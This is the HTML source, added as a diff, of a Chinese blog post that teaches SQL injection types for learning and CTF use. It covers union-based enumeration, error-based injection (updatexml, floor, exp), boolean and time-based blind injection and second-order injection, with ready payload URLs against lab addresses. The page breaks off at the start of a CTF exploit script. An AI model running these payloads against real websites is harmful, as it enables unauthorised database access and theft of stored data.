@@ -1,0 +1,711 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>web常见漏洞类型 | 网络安全学习</title><meta name="author" content="J-Guardian"><meta name="copyright" content="J-Guardian"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="SQL注入  1）可回显的注入   可以联合查询的注入。  报错注入。  通过注入进行DNS请求，从而达到可回显的目的。  2）不可回显的注入   Bool盲注。  时间盲注。  3）二次注入  整数和字符注入 用&#39;判断   先输入：’，如果页面回显出现异常，就说明输入的’是有效果的，’的作用：判断注入类型是数字型还是字符型。例如：&quot;SELECT Id FROM users WH">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web常见漏洞类型">
+<meta property="og:url" content="http://example.com/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/index.html">
+<meta property="og:site_name" content="网络安全学习">
+<meta property="og:description" content="SQL注入  1）可回显的注入   可以联合查询的注入。  报错注入。  通过注入进行DNS请求，从而达到可回显的目的。  2）不可回显的注入   Bool盲注。  时间盲注。  3）二次注入  整数和字符注入 用&#39;判断   先输入：’，如果页面回显出现异常，就说明输入的’是有效果的，’的作用：判断注入类型是数字型还是字符型。例如：&quot;SELECT Id FROM users WH">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2025-02-26T07:44:15.000Z">
+<meta property="article:modified_time" content="2025-02-26T07:45:01.717Z">
+<meta property="article:author" content="J-Guardian">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "web常见漏洞类型",
+  "url": "http://example.com/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/",
+  "image": "https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png",
+  "datePublished": "2025-02-26T07:44:15.000Z",
+  "dateModified": "2025-02-26T07:45:01.717Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "J-Guardian",
+      "url": "http://example.com/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'web常见漏洞类型',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">网络安全学习</span></a><a class="nav-page-title" href="/"><span class="site-name">web常见漏洞类型</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 列表</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">web常见漏洞类型</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-02-26T07:44:15.000Z" title="发表于 2025-02-26 15:44:15">2025-02-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-02-26T07:45:01.717Z" title="更新于 2025-02-26 15:45:01">2025-02-26</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/EhZ7RkSefZ6Y4bXnga9vCi.png" class title="img">
+
+<p>1）可回显的注入 </p>
+<ul>
+<li>可以联合查询的注入。 </li>
+<li>报错注入。 </li>
+<li>通过注入进行DNS请求，从而达到可回显的目的。</li>
+</ul>
+<p>2）不可回显的注入 </p>
+<ul>
+<li>Bool盲注。 </li>
+<li>时间盲注。</li>
+</ul>
+<p>3）二次注入 </p>
+<h2 id="整数和字符注入"><a href="#整数和字符注入" class="headerlink" title="整数和字符注入"></a>整数和字符注入</h2><ul>
+<li>用<code>&#39;</code>判断</li>
+</ul>
+<p> 先输入：’，如果页面回显出现异常，就说明输入的’是有效果的，’的作用：判断注入类型是数字型还是字符型。例如：<code>&quot;SELECT Id FROM users WHERE user_id = &#39;$id&#39;&quot;</code></p>
+<ul>
+<li><ul>
+<li><p>数字型：查询语句 &#x3D; id <code>?id=1</code></p>
+</li>
+<li><p>字符型：查询语句&#x3D;‘id’ <code>?id=&#39;1&#39;</code></p>
+</li>
+<li><ul>
+<li>数字型用’进行测试，带入单引号进去【1’】，<code>SELECT Id FROM users WHERE user_id = 1&#39;</code>在正常情况下也会报错，但报错的语句是不一样的，因为会告诉你id没有1’，</li>
+<li>字符型用’进行测试，带入单引号进去【1’】，<code>SELECT Id FROM users WHERE user_id =&#39;1&#39;&#39;</code>会把前面的语句进行闭合，组后会多一个’而导致页面报错；</li>
+<li>在加上了<code>&#39;</code>后【1’】页面没有特别的报错，也没有提示我们这<code>&#39;</code>有问题，一般猜测来说就是查询不到<code>1&#39;</code>的内容，所以判断是数字型。</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>用and判断</p>
+</li>
+</ul>
+<p>判断到了上面那个位置还没判断出来是不是注入点，一般通过带入语句，例如and 1&#x3D;1:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.1.116/index.php?id=1 and 1=1</span><br></pre></td></tr></table></figure>
+
+<p> 如果页面正常，就说明接受了我们这个语句。存在注入。</p>
+<p> 再带入and 1&#x3D;2</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.1.116/index.php?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+
+<p> 显示异常。在判断id&#x3D;1的时候，用and将1&#x3D;2和id&#x3D;1并在一起执行的，页面可以接受我们传输的语句，导致了页面回显异常。存在注入</p>
+<h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><ul>
+<li>原理：原本，<code>id=1</code>时，会列出一个表格（查询的结果实际上是一个表格），当我们执行联合查询语句<code>union select 1</code>时，会生成第二个表，那么此时就生成了两个虚拟表，而****两个虚拟表的列数需要一致****。</li>
+<li>列数：order by是以列数即第几列进行排序的，但当列数不存在时就会报错或者无回显。 例如，当我们输入</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.1.116/index.php?id=1 order by 10</span><br></pre></td></tr></table></figure>
+
+<p> 此时的页面出现了错误，就说明这个页面没有10列；当我们继续输入order by 4时有正常显示、order by 5时无回显，说明存在4列。</p>
+<ul>
+<li>联合查询：</li>
+</ul>
+<p>****前表出错、后表执行：****列如整数型<code>?id=1 union select 1,2,3,4</code>相当于我们构造一个表格让它插入页面中。 做联合查询需要。<code>id=1</code>相当于前表，<code>1,2,3,4</code>相当于后表，<code>前表出错、后表执行</code>就是要让<code>id=1</code>的表报错即可，一下提供两种方法可以使<code>id=1</code>报错</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1 and 1=2 union select 1,2,3,4</span><br><span class="line">id=-1 union select 1,2,3,4</span><br></pre></td></tr></table></figure>
+
+<p>****前后表都执行：****列入字符型注入<code>&quot;SELECT Id FROM users WHERE user_id = &#39;$id&#39;&quot;; </code>字符型注入需要在联合查询加英文状态下的单引号，假如此时传入如下参数：</p>
+<p><code>?id=-1&#39;union+select+1+--+ </code>拼接后SQL语句就变成了： </p>
+<p><code>SELECT Id FROM users WHERE user_id=&#39;-1&#39;union select 1 -- &#39;</code>闭合前面的单引号，–注释掉后面的单引号（或者使用****%23 或者–+，%23为#****），中间写上需要的Payload就可以了。“+” 号，服务器在处理用户输入的时候已经自动将加号转义为空格符了。</p>
+<p>****最后查询****：要查数据库的版本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://172.16.1.116/index.php?id=-1 union select 1,2,3,version()</span><br></pre></td></tr></table></figure>
+
+<p>完整例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># 寻找注入点</span><br><span class="line">http://172.16.1.116/index.php?id=1</span><br><span class="line"></span><br><span class="line"># 判断虚拟表列数 </span><br><span class="line">http://172.16.1.116/index.php?id=1 order by 1</span><br><span class="line">http://172.16.1.116/index.php?id=1 order by 4</span><br><span class="line">http://172.16.1.116/index.php?id=1 order by 5</span><br><span class="line"># 确定列数为4</span><br><span class="line"></span><br><span class="line"># 查看回显位置</span><br><span class="line">http://172.16.1.116/index.php?id=-1 union select 1,2,3,4 #</span><br><span class="line"></span><br><span class="line"># 查询数据库</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,schema_name,4 from information_schema.schemata limit 0,1</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,schema_name,4 from information_schema.schemata limit 1,2</span><br><span class="line">……</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的表</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,table_name,4 from information_schema.tables where table_schema=&#x27;数据库名&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 查询指定表中字段名</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,column_name,4 from informtion_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27; limit 0,1</span><br><span class="line"></span><br><span class="line"># 导出数据(查看数据库数据)</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,字段名,4 from 数据库名.表名</span><br><span class="line">注意：</span><br><span class="line">1、为什么后面会用“limit”？limit表示范围，因为只会显示1行。</span><br><span class="line">2、如果要显示所有，可以用group_concat()函数【后面会写到】</span><br><span class="line">3、id=-1是因为只有前表出错后表才能执行</span><br><span class="line"></span><br><span class="line">使用group_concat()函数</span><br><span class="line"># 查询所有数据库</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,group_concat(schema_name),4 from information_schema.schemata</span><br><span class="line"></span><br><span class="line"># 查询指定数据库中的所有表</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=&#x27;数据库名&#x27;</span><br><span class="line"></span><br><span class="line"># 查询指定表中所有字段名</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,group_concat(column_name),4 from information_schema.columns where table_schema=&#x27;数据库名&#x27; and table_name=&#x27;表名&#x27;</span><br><span class="line"></span><br><span class="line">#查看数据库数据</span><br><span class="line">http://129.168.1.1/?id=-1 union select 1,2,字段名,4 from 数据库名.表名</span><br></pre></td></tr></table></figure>
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>updatexml、floor和exp。 </p>
+<h3 id="1-updatexml"><a href="#1-updatexml" class="headerlink" title="1.updatexml"></a>1.updatexml</h3><p>函数说明：updatexml()函数实际上是去更新了XML文档，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">updatexml(xml_document,xpath_string,new_value)</span><br></pre></td></tr></table></figure>
+
+<p>第一个参数:XML_document是String格式，为XML文档对象的名称</p>
+<p>第二个参数: XPath_string (Xpath格式的字符串)，文档路径</p>
+<p>第三个参数: new_value，String格式，替换查找到的符合条件的数据。</p>
+<p>作用: 改变文档中符合条件的节点的值。</p>
+<p>但是我们在xml文档路径的位置里面写入了子查询，我们输入特殊字符，然后就因为不符合输入规则然后报错了，但是报错的时候它其实已经执行了那个子查询代码。</p>
+<p>如下所示。 </p>
+<img src="/2025/02/26/web%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%B1%BB%E5%9E%8B/image.png" class title="img">
+
+<p>这里使用前面的例子，举出一个爆破数据库版本的样例Payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;+updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23 </span><br></pre></td></tr></table></figure>
+
+<h3 id="2-floor"><a href="#2-floor" class="headerlink" title="2.floor"></a>2.floor</h3><ul>
+<li>floor函数说明：floor()函数和JavaScript中的Math.floor()函数的作用是一样的，也就是向下取整。</li>
+<li>rand函数说明：rand() 是一个随机函数：产生0～1的小数。rand(0)通过一个固定的随机数的种子0之后，可以形成固定的伪随机序列</li>
+<li>group by函数：分组查询，在逐个查询时会产生一个虚表，虚表中group by后的字段不可重复。</li>
+</ul>
+<p>例如：对于已下查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*),(floor(rand(0)*2)) as x from 表名 group by x</span><br></pre></td></tr></table></figure>
+
+<p>假如：<code>(rand(0)</code>产生的伪随机序列为011011011。</p>
+<p>第1条数据：<code>floor(rand(0)*2</code>产生0，查询虚表中没有，会插入到虚表中，但是<em><strong>*插入到虚表会再次执行*</strong></em><code>***\*floor(rand(0)\*2\****</code>，实际插入的是count(*)&#x3D;1和<code>***\*floor(rand(0)\*2\****</code>产生的1。</p>
+<p>第2条数据：产生<code>floor(rand(0)*2</code>为1，查询虚表中有，直接将虚表中中的count(*)+1。</p>
+<p>第3条数据：产生<code>floor(rand(0)*2</code>为0，查询虚表中没有，但是<em><strong>*插入到虚表会再次执行*</strong></em><code>***\*floor(rand(0)\*2\****</code>，实际插入的是count(<em>)&#x3D;1和<code>***\*floor(rand(0)\*2\****</code>产生的1，但是此时虚表中已经存在count(</em>)&#x3D;1和<code>***\*floor(rand(0)\*2\****</code>&#x3D;1（由第1条数据产生的），就会出现”Duplicate entry ‘1’ for key <group_key>“的报错。</group_key></p>
+<p><strong>爆数据库名：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user_rule WHERE id = 1 AND </span><br><span class="line">(SELECT 1 from </span><br><span class="line"></span><br><span class="line">(SELECT count(*),concat(0x23,(SELECT schema_name from information_schema.schemata LIMIT 0,1),0x23,floor(rand(0)*2))</span><br><span class="line">as x from information_schema.`COLUMNS` GROUP BY x) </span><br><span class="line"></span><br><span class="line">as y)</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆表</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user_rule WHERE id = 1 AND (SELECT 1 from </span><br><span class="line">(SELECT count(*),concat(0x23,</span><br><span class="line">(SELECT table_name from information_schema.`TABLES` WHERE table_schema = database() LIMIT 0,1),</span><br><span class="line">0x23,floor(rand(0)*2)) as x </span><br><span class="line">from information_schema.`COLUMNS` GROUP BY x) </span><br><span class="line">as y)</span><br></pre></td></tr></table></figure>
+
+<p><strong>爆列</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM user_rule WHERE id = 1 AND (SELECT 1 from </span><br><span class="line">(SELECT count(*),concat(0x23,(SELECT column_name from information_schema.COLUMNS where table_name = &#x27;members&#x27; LIMIT 0,1),</span><br><span class="line">0x23,floor(rand(0)*2)) as x </span><br><span class="line">from information_schema.`COLUMNS` GROUP BY x) </span><br><span class="line">as y)</span><br></pre></td></tr></table></figure>
+
+<p>以上爆库表列代码中最后的y为表示派生表命名为y。如果不添加这个字符串会出现报错（Every derived table must have its own alias）表示派生表未被命名。</p>
+<h3 id="3-exp"><a href="#3-exp" class="headerlink" title="3.exp"></a>3.exp</h3><p>函数说明：exp()是以e为底的指数函数。5.5&lt;mysql版本&lt;5.6。但是，由于数字太大是会产生溢出。这个函数会在参数大于709时溢出，如select exp(710)，会报错”DOUBLE value is out of range in ‘<em><strong>*exp(710)*</strong></em>‘“。</p>
+<p>利用溢出时，会将exp函数的参数同时输出即报错中的’<em><strong>*exp(710)*</strong></em>‘。此时将0按位取反（取反之后为“18446744073709551615”），select ~0，就会返回“18446744073709551615”。</p>
+<p>通过子查询与按位求反，造成一个DOUBLE overflow error，并借由此注出数据：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select *from users where 1=1 and (exp(~(select * from (操作代码) a)))</span><br></pre></td></tr></table></figure>
+
+<p>字母“a”，前面的例句还用了“x”，其实这里可以使用任何字符串，用于表示派生表命名为a。</p>
+<p>如果我们不添加这个字符串会出现报错（Every derived table must have its own alias）表示派生表未被命名。 </p>
+<h2 id="Bool盲注"><a href="#Bool盲注" class="headerlink" title="Bool盲注"></a>Bool盲注</h2><p>原理：Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如为真时返回access，为假时返回false；或者为真时返回正常页面，为假时跳转到错误页面等。 </p>
+<p>Bool盲注中通常会配套使用一些判断真假的语句来进行判定。常用的发现Bool盲注的方法是在输入点后面添加and 1&#x3D;1和and 1&#x3D;2（该Payload应在怀疑是整型注入的情况下使用）。 如果题目后端拼接了SQL语句，and 1&#x3D;1为真时不会影响执行结果，但是and 1&#x3D;2为假，页面则可能会没有正常的回显。 </p>
+<p>有时候我们可能会遇到将1&#x3D;1过滤掉的SQL注入点，这时候我们可以通过修改关键字来绕过过滤，比如将关键字修改为不常见的数值（如1352&#x3D;1352等）。 </p>
+<p>在字符串型注入的时候我们还需要绕过单引号，将Payload修改为如下格式<code>&#39;and&#39;1&#39;=&#39;1</code>和<code>&#39;or&#39;1&#39;=&#39;2</code>来闭合单引号。 </p>
+<p>在Bool盲注中，我们经常使用的函数有以下几种分类，具体如表  </p>
+<p>（1）截取函数</p>
+<p>substr(str,start,length)：取字符串str的[start,start+length]。盲注时一般只截取1位。如substr(user(),1,1)截取第一位遍历字符测试出第一位的字符，遍历整个字符串。 </p>
+<p>left(str,length)：取字符串str的[0,length]。</p>
+<p>rigth(str,length)：参考left。</p>
+<p>例如：<code>select a from b where id= 1 and left(user(),1) = &#39;a&#39;</code></p>
+<p>之后<code>select a from b where id= 1 and left(user(),2) = &#39;ad&#39;</code></p>
+<p>（2）转换函数</p>
+<p>ascii(str)：将字符串str转化成ASCII码，****可以避免在pyload中出现单引号****（将字符转化成了整数）。使用时一般只取一个字符ascii(substr(user(),1,1,))。</p>
+<p>hex(str)：将字符串的值转换为十六进制的值，在ascii函数被禁用时可使用。使用方式类似ascii函数。</p>
+<p>（3）比较函数</p>
+<p>if(cond,Ture_result,False_result)：cond为判断条件，True_result为判断条件为真时返回的结果，False_result相反。例如：?id&#x3D;1 and 1 &#x3D; if(ascii (<em><strong>*substr(user(),1,1)*</strong></em>)  &#x3D;97,1,2)：(<em><strong>*substr(user(),1,1)*</strong></em>)  &#x3D;97为真返回1，语句后面的and 1&#x3D;1 成立，否则返回2，语句后面的and 1&#x3D;2不成立。可以根据返回错误页面的长度进行判断。</p>
+<p>注意：在盲注的题目及真实的渗透测试中，有时候使用Sqlmap可能会存在误报。原因在于在一些数据返回页面及接口返回数据时可能会存在返回的是随机字符串（如，时间戳或防止CSRF的Token等）导致页面的长度发生变化的情况，这时候我们的工具及自动化检测脚本会 出现误报。我们需要冷静地Payload和返回结果进行分析。</p>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>原理：时间盲注出现的本质原因也是由于服务器端拼接了SQL语句，但是正确和错误存在同样的回显。错误信息被过滤，不过，可以通过****页面响应时间****进行按位判断数据。由于时间盲注中的函数是在数据库中执行的，因此在CTF比赛中关于时间盲注的题目比较少，原因在于sleep函数或者benchmark函数的过多执行会让服务器负载过高。</p>
+<p>sleep(N)：睡眠函数，延迟N秒执行。例如：if (ascii(right(user(),1)&#x3D;122,sleep(5),2))。</p>
+<p>benchmark(N,expression)：重复执行expreesion语句，原本用于测试数据库的读写性能。通过多次执行语句所消耗时间和性能，表现出的时间延迟来判断。例如：if(ascii(right(user(),1)&#x3D;122,benchmark(5,MD5()),2))</p>
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>原理：二次注入的起因是数据在****第一次入库的时候进行了一些过滤及转义，当这条数据从数据库中取出来在SQL语句中进行拼接****，而在这次拼接中没有进行过滤时，我们就能执行构造好的SQL语句了。 </p>
+<p>在二次注入的题目中，通常还会与报错注入或Bool盲注结合出题。比如，在注册页面输入的用户名在登录后才有盲注的回显，这时候我们需要自己编写脚本模拟注册及登录。 </p>
+<p>下面列举一个二次注入中包含盲注的例子（2016年西电信安协会 的l-ctf），简单描述下当时的题目。存在用户的登录与注册页面，登录后可以修改用户的头像，判断注入的点也就是这个头像是否有显示。如果注册时用户名构造的Payload为真，则可以在页面收到回显的头像的地址，反之则没有。因为在测试时发现头像的链接很长，所以我们用页面返回长度来确定盲注结果，下面是当时写的漏洞利用代码，我们在代码的注释中解释了每条语句的原理：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span 